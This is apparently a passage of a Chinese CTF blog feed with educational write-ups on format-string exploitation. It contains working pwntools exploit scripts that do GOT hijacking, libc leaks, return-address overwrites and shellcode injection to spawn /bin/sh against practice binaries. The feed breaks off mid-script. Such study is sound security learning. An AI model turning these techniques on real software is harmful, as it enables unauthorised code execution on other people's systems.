segments</code></pre><p>没有任何保护。</p><h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p><p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p><p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p><p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p><p>然后再看一个有点不一样的题目：</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p><h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li></ul><p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p><p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址和got+2地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li></ul><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p><p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p><p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（下）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（下）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞题目练习</title>
    <link href="http://chumen77.xyz/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/03/15/格式化字符串漏洞题目练习/</id>
    <published>2020-03-15T06:38:15.000Z</published>
    <updated>2020-04-05T12:54:41.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  │····│····│····│····│    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  │%240│c%7$│hhn%│132c│    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  │%8$h│hn%1│28c%│9$hh│    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               │n%4c│%10$│hhn·││    0000003c</code></pre><p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>编译为64位。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p><ul><li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li><li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了RELRO，这样就无法修改got了。</p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = 